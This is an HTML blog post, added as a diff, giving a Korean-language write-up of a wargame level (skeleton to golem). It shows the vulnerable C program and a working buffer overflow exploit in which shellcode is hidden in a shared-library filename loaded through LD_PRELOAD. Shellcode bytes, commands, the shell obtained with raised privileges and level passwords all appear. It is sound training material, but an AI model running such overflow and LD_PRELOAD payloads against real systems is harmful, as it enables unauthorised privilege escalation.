@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[Wargame] 해커스쿨 BoF LEVEL11 (Skeleton -> Golem) : Stack Destroyer</title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/css/main.css" type="text/css">
+
+  <!-- Font -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link href='//spoqa.github.io/spoqa-han-sans/css/SpoqaHanSans-kr.css' rel='stylesheet' type='text/css'>
+  <link href="https://fonts.googleapis.com/css?family=Ubuntu+Mono" rel="stylesheet">
+
+  <link rel="alternate" type="application/rss+xml" title="RSS Feed for Writeup oriented CTF for fun and profit" href="/feed.xml" />
+  <!-- Begin Jekyll SEO tag v2.3.0 -->
+<title>[Wargame] 해커스쿨 BoF LEVEL11 (Skeleton -&gt; Golem) : Stack Destroyer | Writeup oriented CTF for fun and profit</title>
+<meta property="og:title" content="[Wargame] 해커스쿨 BoF LEVEL11 (Skeleton -&gt; Golem) : Stack Destroyer" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="id = skeleton pw = shellcoder" />
+<meta property="og:description" content="id = skeleton pw = shellcoder" />
+<link rel="canonical" href="http://localhost:4000/2015-11-16/hackerschool-BoF-stage-11/" />
+<meta property="og:url" content="http://localhost:4000/2015-11-16/hackerschool-BoF-stage-11/" />
+<meta property="og:site_name" content="Writeup oriented CTF for fun and profit" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2015-11-16T07:03:10+09:00" />
+<script type="application/ld+json">
+{"name":null,"description":"id = skeleton pw = shellcoder","author":null,"@type":"BlogPosting","url":"http://localhost:4000/2015-11-16/hackerschool-BoF-stage-11/","publisher":null,"image":null,"headline":"[Wargame] 해커스쿨 BoF LEVEL11 (Skeleton -&gt; Golem) : Stack Destroyer","dateModified":"2015-11-16T07:03:10+09:00","datePublished":"2015-11-16T07:03:10+09:00","sameAs":null,"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2015-11-16/hackerschool-BoF-stage-11/"},"@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+
+  <!-- Google Analytics -->
+
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', '', 'auto');
+ga('send', 'pageview');
+
+</script>
+
+
+
+</head>
+
+<body>
+  <div class="content-container">
+    <header>
+  <div class="header-small">
+    <a href="http://localhost:4000">Writeup oriented CTF for fun and profit</a>
+  </div>
+</header>
+<div class="post">
+  <div class="post-title">[Wargame] 해커스쿨 BoF LEVEL11 (Skeleton -> Golem) : Stack Destroyer</div>
+  <span class="post-date">
+    <time>16 Nov 2015</time>
+  </span>
+  <div class="post-tag">
+    <ul>
+      
+      <li>
+        <a href="http://localhost:4000/tags#bof">
+          <span>bof</span>
+        </a>
+      </li>
+      
+      
+    </ul>
+  </div>
+
+  <ul>
+  <li>id = skeleton</li>
+  <li>pw = shellcoder</li>
+</ul>
+
+<!--more-->
+
+<h2 id="1-문제--golemc">1. 문제 : golem.c</h2>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - golem
+        - stack destroyer
+*/</span>
+
+<span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+<span class="k">extern</span> <span class="kt">char</span> <span class="o">**</span><span class="n">environ</span><span class="p">;</span>
+
+<span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
+        <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"argv error</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">47</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">'\xbf'</span><span class="p">)</span>
+        <span class="p">{</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"stack is still your friend.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+
+        <span class="c1">// stack destroyer!
+</span>        <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">44</span><span class="p">);</span>
+        <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="o">+</span><span class="mi">48</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0xbfffffff</span> <span class="o">-</span> <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="n">buffer</span><span class="o">+</span><span class="mi">48</span><span class="p">));</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="11-변경된-코드">1.1 변경된 코드</h3>
+
+<p>으악… buffer[40] 뒤에 LR 이후부터 stack bottom까지 모두 0으로 clear 시킨다. 즉, shellcode 를 stack 에 올려놓고 실행을 할 수 없다는 것이다. 그렇다면… ROP (Return-Oriented Programming)이나 return-to-libc 기법으로 기존 코드를 재활용하여 shellcode 동작시켜야 할 것 같다.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// stack destroyer!
+</span>        <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">44</span><span class="p">);</span>
+        <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="o">+</span><span class="mi">48</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0xbfffffff</span> <span class="o">-</span> <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="n">buffer</span><span class="o">+</span><span class="mi">48</span><span class="p">));</span>
+</code></pre></div></div>
+
+<h2 id="2-공격-방법-고민">2. 공격 방법 고민</h2>
+
+<p>물론 ROP도 가능하겠지만 이것은 아마도 맨 뒤에 나올 듯 하고, 이보다 쉽게 접근 가능한 방법이 바로 공유 라이브러리를 이용하는 것인가보다. 사실 이 방법은 잘 몰라서 힌트를 좀 봤다. :)</p>
+
+<p>프로그램에서 stack 을 다 초기화시키고 있지만 공유라이브러리 사용을 부분에 지워지지 않는 부분이 있는 듯 하다. 파일을 shared library 로 compile 하여 사용하고, 이 파일 이름에 shellcode 를 올려 놓고, 여기 가르키도록 공격을 할 예정이다.</p>
+
+<h3 id="21-shared-library-compile-할-소스">2.1 shared library compile 할 소스</h3>
+
+<p>사실 이번에 중요한 것은 공유라이브러리로 올리가는 object 의 파일 이름.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">shell</span><span class="p">()</span> <span class="p">{}</span>
+</code></pre></div></div>
+
+<h2 id="22-shared-library-compile">2.2 shared library compile</h2>
+
+<ul>
+  <li>fPIC : Position Indepedent Code</li>
+  <li>shared : shared library</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gcc shellcode.c <span class="nt">-fPIC</span> <span class="nt">-shared</span> <span class="nt">-o</span> <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*200 + "\x68\xf9\xbf\x0f\x40\x68\xe0\x91\x03\x40\xb8\xe0\x8a\x05\x40\x50\xc3"'</span><span class="sb">`</span>
+
+<span class="o">&gt;</span>  file <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*200 + "\x68\xf9\xbf\x0f\x40\x68\xe0\x91\x03\x40\xb8\xe0\x8a\x05\x40\x50\xc3"'</span><span class="sb">`</span>  
+hù¿@hà@¸à@PÃ: ELF 32-bit LSB shared object, Intel 80386, version 1, not stripped
+</code></pre></div></div>
+
+<h2 id="23-ld_preload-에-등록">2.3 LD_PRELOAD 에 등록</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export LD_PRELOAD="./`python -c 'print "\x90"*200 + "\x68\xf9\xbf\x0f\x40\x68\xe0\x91\x03\x40\xb8\xe0\x8a\x05\x40\x50\xc3"'`"
+</code></pre></div></div>
+
+<h2 id="24-디버깅">2.4 디버깅</h2>
+
+<h3 id="241-stack-bottom">2.4.1 Stack bottom</h3>
+
+<p>마지막 ret 하기 이전 stack 상황. 모드 clear 된 상태.</p>
+
+<p><img src="https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage11-1.png" alt="img" /></p>
+
+<h3 id="242-ld_preload-내용은-어디에-">2.4.2 LD_PRELOAD 내용은 어디에 ?</h3>
+
+<p>사실 LD_PRELOAD로 설정된 내용이 메모리 어디에 잡히는지 아직 잘 모르겠다. 현재 Stack 윗 메모리 중에 해당 내용이 잡혀 있긴 하다.</p>
+
+<p><img src="https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage11-3.png" alt="img" /></p>
+
+<h2 id="3-공격">3. 공격</h2>
+
+<p>LR 값은 0xbffff770 으로 선택.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./golem <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "A"*44 + "\x70\xf7\xff\xbf"'</span><span class="sb">`</span>    
+
+bash<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>510<span class="o">(</span>skeleton<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>510<span class="o">(</span>skeleton<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>511<span class="o">(</span>golem<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>511<span class="o">(</span>golem<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>510<span class="o">(</span>skeleton<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="4-다음-단계-정보">4. 다음 단계 정보</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>510<span class="o">(</span>skeleton<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>510<span class="o">(</span>skeleton<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>511<span class="o">(</span>golem<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>511<span class="o">(</span>golem<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>510<span class="o">(</span>skeleton<span class="o">)</span>
+
+bash<span class="nv">$ </span>my-pass
+euid <span class="o">=</span> 511
+cup of coffee
+</code></pre></div></div>
+
+<h2 id="5-의문점">5. 의문점</h2>
+
+<h4 id="ld_preload-관련-위치">LD_PRELOAD 관련 위치</h4>
+
+<p>ldd 로 확인해본 위치로는 0x40015000 에 잡혀있네요. 이번 문제에서는 LR이 0xbfff—- 을 사용해야 하므로 이 값은 쓸 수 없겠네요. Stack 위에도 이 값이 copy 되어 잡히게 되는 것인가요 ?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ldd /bin/ls
+        ./hù¿@hà@¸à@PÃ =&gt; ./hù¿@hà@¸à@PÃ (0x40015000)
+        libtermcap.so.2 =&gt; /lib/libtermcap.so.2 (0x4001a000)
+        libc.so.6 =&gt; /lib/libc.so.6 (0x4001e000)
+        /lib/ld-linux.so.2 =&gt; /lib/ld-linux.so.2 (0x40000000)
+</code></pre></div></div>
+
+<h5 id="nop-앞-부분-jump-시-fault">NOP 앞 부분 jump 시 fault</h5>
+
+<p>NOP 를 200 bytes 로 충분히 넣었는데, 앞부분으로 jump 하면 fault 가 발생하네요. Stack 위치 계산이 틀어져서 약간 오차가 있는 것이 잘 모르겠네요…</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// Fault
+&gt;  ./golem `python -c 'print "A"*44 + "\x20\xf7\xff\xbf"'`  
+Program received signal SIGSEGV, Segmentation fault.
+0x40032942 in __libc_start_main (main=???, argc=???, argv=???, init=???,
+    fini=???, rtld_fini=???, stack_end=???)
+    at ../sysdeps/generic/libc-start.c:73
+73      ../sysdeps/generic/libc-start.c: No such file or directory.  
+
+// OK
+&gt;  ./golem `python -c 'print "A"*44 + "\x24\xf7\xff\xbf"'`
+</code></pre></div></div>
+
+
+
+  <!-- Disqus -->
+  
+  <div class="post-disqus">
+      <section id="disqus_thread"></section>
+      <script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables */
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = '//humb1ec0ding.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  </div>
+  
+
+</div>
+
+
+    <!-- Documents about icons are here: http://fontawesome.io/icons/ -->
+<div class="footer">
+  <hr />
+  <div class="footer-link">
+    
+	
+	
+	
+	
+
+    
+    <a href="https://twitter.com/humb1ec0ding"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+    
+
+    
+    <a href="https://github.com/humb1ec0ding"><i class="fa fa-github" aria-hidden="true"></i></a>
+    
+	
+	
+	
+	
+
+    
+	
+	
+	
+	
+	
+	
+	
+	
+
+    
+
+    
+
+    
+    <a href="mailto:humblecoding@gmail.com"><i class="fa fa-envelope" aria-hidden="true"></i></a>
+    
+
+  </div>
+  © 2017 humb1ec0ding. All rights reserved.
+</div>
+
+  </div>
+</body>
+</html>
